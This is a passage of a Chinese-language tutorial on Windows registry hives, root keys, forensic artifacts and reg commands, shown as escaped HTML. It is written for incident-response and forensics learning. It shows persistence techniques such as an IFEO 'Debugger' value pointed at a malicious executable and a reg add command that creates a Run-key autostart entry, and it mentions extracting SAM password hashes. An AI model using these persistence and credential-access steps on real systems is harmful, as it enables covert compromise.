&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SAM&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;security&#34;&gt;SECURITY
&lt;/h4&gt;&lt;p&gt;存储系统范围内的安全策略和用户权限分配&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\System32\config\SECURITY&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;ntuserdat&#34;&gt;NTUSER.DAT
&lt;/h4&gt;&lt;p&gt;每个用户都有一个独立的，存储该用户的个性化设置，如桌面背景、程序历史记录等&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Users\&amp;lt;用户名&amp;gt;\NTUSER.DAT&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;usrclassdat&#34;&gt;UsrClass.dat
&lt;/h4&gt;&lt;p&gt;同样是每个用户一个，存储文件关联和COM类注册信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Users\&amp;lt;用户名&amp;gt;\AppData\Local\Microsoft\Windows\UsrClass.dat&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;amcachehve&#34;&gt;Amcache.hve
&lt;/h4&gt;&lt;p&gt;记录了近期在该系统上运行过的应用程序及其路径、安装时间等信息&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;C:\Windows\appcompat\Programs\Amcache.hve&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;bcd&#34;&gt;BCD
&lt;/h4&gt;&lt;p&gt;存储了系统的启动菜单和配置信息，决定了计算机如何启动操作系统&lt;/p&gt;
&lt;p&gt;没有扩展名，文件名就是BCD，即Boot Configuration Data&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：通常位于系统启动分区，例如 \Boot\BCD&lt;/p&gt;
&lt;h3 id=&#34;注册表的根键逻辑层---hkey&#34;&gt;注册表的根键（逻辑层 - HKEY）
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;regedit.exe&lt;/code&gt;的&lt;code&gt;HKEY_...&lt;/code&gt;开头的顶级文件夹，是操作系统为了方便管理而创建的逻辑视图，被称为根键&lt;/p&gt;
&lt;p&gt;这些根键将不同的Hive文件组合在一起，形成树状结构&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;每一个根键都是一个项（文件夹），下面有着各种项，项里又定义着各种键值对（内容）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注册表包括以下五个根键，其中只有HKLM和HKU是真实映射Hive的，其余都是它们的视图：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;1-hkey_classes_roothkcr&#34;&gt;1. HKEY_CLASSES_ROOT（HKCR）
&lt;/h4&gt;&lt;p&gt;它负责管理文件的类型关联（决定双击文件用什么程序打开）和 COM 组件的注册信息&lt;/p&gt;
&lt;p&gt;它是&lt;strong&gt;虚拟的、合并而成的视图&lt;/strong&gt;，由&lt;code&gt;HKLM\SOFTWARE\Classes&lt;/code&gt;和&lt;code&gt;HKCU\Software\Classes&lt;/code&gt;这两个键合并而成&lt;/p&gt;
&lt;h4 id=&#34;2-hkey_current_userhkcu&#34;&gt;2. HKEY_CURRENT_USER（HKCU）
&lt;/h4&gt;&lt;p&gt;该根键包括当前登录用户的配置信息，包括环境变量，个人程序以及桌面设置等&lt;/p&gt;
&lt;p&gt;它实际上是指向&lt;code&gt;HKEY_USERS&lt;/code&gt;下当前用户SID的一个&lt;strong&gt;快捷方式&lt;/strong&gt;，其内容来自当前用户的&lt;code&gt;NTUSER.DAT&lt;/code&gt;文件&lt;/p&gt;
&lt;h4 id=&#34;3-hkey_local_machinehklm&#34;&gt;3. HKEY_LOCAL_MACHINE（HKLM）
&lt;/h4&gt;&lt;p&gt;该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息&lt;/p&gt;
&lt;p&gt;它主要映射了&lt;code&gt;SYSTEM&lt;/code&gt;，&lt;code&gt;SOFTWARE&lt;/code&gt;，&lt;code&gt;SAM&lt;/code&gt;，&lt;code&gt;SECURITY&lt;/code&gt;等Hive&lt;/p&gt;
&lt;h4 id=&#34;4-hkey_usershku&#34;&gt;4. HKEY_USERS（HKU）
&lt;/h4&gt;&lt;p&gt;该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问，告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体&lt;/p&gt;
&lt;p&gt;它的每个子项是一个用户的SID，此外还有.DEFAULT子项，是系统为新用户创建账户时的配置模板&lt;/p&gt;
&lt;h4 id=&#34;5-hkey_current_confighkcc&#34;&gt;5. HKEY_CURRENT_CONFIG（HKCC）
&lt;/h4&gt;&lt;p&gt;该根键包括当前硬件的配置信息，其内容**完全指向（或映射自）**以下这个更深的注册表路径：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Hardware Profiles\Current&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;常用注册表项&#34;&gt;常用注册表项
&lt;/h2&gt;&lt;h3 id=&#34;持久化机制&#34;&gt;持久化机制
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是恶意软件实现开机自启、确保自身不被清除最常用的位置&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;开机自启runrunonce&#34;&gt;开机自启（Run/RunOnce）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; (&lt;strong&gt;对所有用户生效&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; (&lt;strong&gt;只对当前用户生效&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt; (&lt;strong&gt;策略控制的启动项&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最经典、最直接的自启动位置写入这里的程序会在用户登录或系统启动时自动执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：检查所有这些&lt;code&gt;Run&lt;/code&gt;键下是否有指向非标准目录（如&lt;code&gt;Temp&lt;/code&gt;、&lt;code&gt;AppData&lt;/code&gt;）的可执行文件，或者是否有名字可疑的启动项&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统服务services&#34;&gt;系统服务（Services）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：将程序注册为系统服务，可以在后台运行，权限高，更隐蔽&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;可疑服务名&lt;/strong&gt;：是否有随机、无意义或拼写错误的服务名称&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;ImagePath&lt;/code&gt;&lt;/strong&gt;：正常服务（如&lt;code&gt;svchost&lt;/code&gt;）的&lt;code&gt;ImagePath&lt;/code&gt;是否被篡改为指向恶意程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;FailureCommand&lt;/code&gt;&lt;/strong&gt;：检查服务失败后执行的命令是否被设置为恶意程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;登录辅助程序winlogon&#34;&gt;登录辅助程序（Winlogon）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：&lt;code&gt;Winlogon.exe&lt;/code&gt;是负责用户登录的核心进程&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Userinit&lt;/code&gt;&lt;/strong&gt;：默认值应为&lt;code&gt;C:\Windows\system32\userinit.exe,&lt;/code&gt;。&lt;strong&gt;检查末尾是否有逗号&lt;/strong&gt;，以及后面是否跟了其他恶意程序的路径（用逗号分隔）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Shell&lt;/code&gt;&lt;/strong&gt;：默认值应为&lt;code&gt;explorer.exe&lt;/code&gt;，如果被修改，意味着用户的整个桌面环境都被替换了&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调试器image-file-execution-optionsifeo&#34;&gt;调试器（Image File Execution Options，IFEO）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：用于在程序启动时附加调试器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关注点&lt;/strong&gt;：攻击者会创建一个以正常程序命名（如&lt;code&gt;notepad.exe&lt;/code&gt;）的子项，然后在其中添加一个名为&lt;code&gt;Debugger&lt;/code&gt;的键值，指向自己的恶意程序：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;HKEY_LOCAL_MACHINE&lt;span style=&#34;color:#98c379&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span style=&#34;color:#98c379&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span style=&#34;color:#98c379&#34;&gt;\W&lt;/span&gt;indows NT&lt;span style=&#34;color:#98c379&#34;&gt;\C&lt;/span&gt;urrentVersion&lt;span style=&#34;color:#98c379&#34;&gt;\I&lt;/span&gt;mage File Execution Options&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;otepad.exe&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Debugger&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;C:\\Path\\To\\EvilDebugger.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样，每当用户尝试运行记事本时，系统会优先运行那个恶意的调试器，而真正的记事本根本不会启动&lt;/p&gt;
&lt;p&gt;也可以用于阻止程序运行，如果调试器不存在，系统找不到指定的.exe，程序就无法启动&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;图像环境dllappinit_dll&#34;&gt;图像环境DLL（AppInit_DLL）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：允许将一个或多个DLL注入到几乎所有加载了&lt;code&gt;user32.dll&lt;/code&gt;的进程中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：检查**&lt;code&gt;AppInit_DLLs&lt;/code&gt;**这个键值是否为空，任何被列在这里的DLL都会被广泛注入，是恶意软件实现全局监控的常用手段&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;com组件clsid&#34;&gt;COM组件（CLSID）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKCR\CLSID\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：存储系统中所有COM组件类ID（CLSID）的信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：检查&lt;code&gt;InprocServer32&lt;/code&gt;等子项的默认值，看其指向的 DLL 路径是否可疑&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;用户账户与凭证&#34;&gt;用户账户与凭证
&lt;/h3&gt;&lt;h4 id=&#34;本地用户信息sam&#34;&gt;本地用户信息（SAM）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SAM\SAM\Domains\Account\Users&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：存储本地用户的账户名、SID、以及最重要的密码哈希&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关注点&lt;/strong&gt;：&lt;code&gt;SAM&lt;/code&gt;受到严格保护，无法直接读取，但可以通过内存取证工具（如 &lt;code&gt;hashdump&lt;/code&gt;）或离线分析&lt;code&gt;SAM&lt;/code&gt;和&lt;code&gt;SYSTEM&lt;/code&gt;文件来提取密码哈希&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;检查&lt;code&gt;Names&lt;/code&gt;子键可以发现所有本地账户，包括可能被隐藏的账户&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户配置文件列表profilelist&#34;&gt;用户配置文件列表（ProfileList）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录了本机上所有用户账户的 SID 以及其个人文件夹（Profile）的路径。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：这是将SID和用户名对应起来的关键，可以发现系统上曾经存在过但已被删除的用户账户痕迹&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;用户活动痕迹&#34;&gt;用户活动痕迹
&lt;/h3&gt;&lt;h4 id=&#34;程序执行历史userassist&#34;&gt;程序执行历史（UserAssist）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录用户通过图形界面（点击图标）运行程序的历史，包括运行次数和最后运行时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;取证关注点&lt;/strong&gt;：还原用户操作的关键，可以清晰地看到用户在特定时间点运行了哪些程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;最近打开的文档recentdocs&#34;&gt;最近打开的文档（RecentDocs）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录用户最近打开过的文档和访问过的文件夹&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：了解用户最近处理了哪些文件，可能会发现恶意文档（如带宏的Word）或攻击者留下的工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;文件夹打开记录bagmru&#34;&gt;文件夹打开记录（BagMRU）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU&lt;/code&gt;（&lt;strong&gt;新版本，主要使用&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\Shell\BagMRU&lt;/code&gt; （&lt;strong&gt;旧版本，不太使用&lt;/strong&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录用户曾经打开过的所有文件夹，每一项代表一个用户访问过的文件夹，每个键的值（如 &lt;code&gt;REG_BINARY&lt;/code&gt;数据）是一个内部结构（MRU记录+路径+配置引用），其中包含路径信息，但不是直接可见的字符串&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：它可以揭示出用户曾经访问过但现在可能已不存在的文件夹，包括网络共享、移动设备上的文件夹，同级目录下的Bags会记录文件夹的具体视图设置&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;usb设备使用历史usbstor&#34;&gt;USB设备使用历史（USBSTOR）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录所有曾接入本机的U盘、移动硬盘等USB存储设备的厂商、型号和唯一的序列号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：可以确定是否有未经授权的U盘接入，并可将特定U盘与数据泄露或恶意软件植入事件关联起来&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;系统与网络信息&#34;&gt;系统与网络信息
&lt;/h3&gt;&lt;h4 id=&#34;网络接口与历史ip-interfaces&#34;&gt;网络接口与历史IP (Interfaces)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录本机所有网络接口（有线网卡、无线网卡）的配置信息，包括历史上曾经获取过的IP地址、子网掩码、网关和DNS服务器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：可以确定机器在不同时间点的网络环境，对于追踪内网漫游或确认C2连接时的源IP地址至关重要&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;最后关机时间-shutdowntime&#34;&gt;最后关机时间 (ShutdownTime)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Windows\ShutdownTime&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录了系统最后一次正常关机的时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：帮助确定系统事件发生的时间窗口&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;时区信息-timezoneinformation&#34;&gt;时区信息 (TimeZoneInformation)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录本机配置的时区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：时间线分析的基准，所有从日志和文件系统中提取的时间戳都必须根据这个时区进行校正，才能得到准确的绝对时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用命令行编辑注册表&#34;&gt;使用命令行编辑注册表
&lt;/h2&gt;&lt;h3 id=&#34;reg命令的基本结构&#34;&gt;reg命令的基本结构
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; reg &amp;lt;操作&amp;gt; &amp;lt;注册表项路径&amp;gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;参数&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;增改add&#34;&gt;增/改(add)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;添加新项（文件夹）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在&lt;code&gt;Run&lt;/code&gt;键下创建一个名为&lt;code&gt;MyApp&lt;/code&gt;的新项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;添加/设置键值（内容）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/v&lt;/code&gt;：指定键值名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/t&lt;/code&gt;：指定类型&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;全称&lt;/th&gt;
          &lt;th&gt;存储内容&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;REG_SZ&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;字符串值&lt;/td&gt;
          &lt;td&gt;人类可读的文本，如路径、名称、描述&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;REG_DWORD&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;32位数值&lt;/td&gt;
          &lt;td&gt;一个整数，通常用作是/否的标志或简单数字配置&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;REG_BINARY&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;二进制值&lt;/td&gt;
          &lt;td&gt;任意的、非结构化的原始字节数据&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/d&lt;/code&gt;：指定数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/f&lt;/code&gt;：如果键值已存在，强制覆盖而不提示&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;在&lt;code&gt;Run&lt;/code&gt;键下创建一个名为&lt;code&gt;Pentestlab&lt;/code&gt;的自启动程序：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; /v Pentestlab /t REG_SZ /d &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;C:\tools\pentestlab.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;删-delete&#34;&gt;删 (delete)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;删除键值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/v&lt;/code&gt;：指定要删除的键值名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/f&lt;/code&gt;：强制删除，不进行确认提示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;删除刚才创建的&lt;code&gt;Pentestlab&lt;/code&gt;启动项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg delete &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; /v Pentestlab /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;删除整个项（及其所有子项和键值）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;删除刚才创建的MyApp项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg delete &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp&amp;#34;&lt;/span&gt; /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查-query&#34;&gt;查 (query)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查询项下的所有内容&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这条命令会列出&lt;code&gt;Winlogon&lt;/code&gt;这个项下所有的子项和键值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查询一个具体的键值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/v&lt;/code&gt;：指定要查询的键值名&lt;/li&gt;
&lt;/ul&gt;
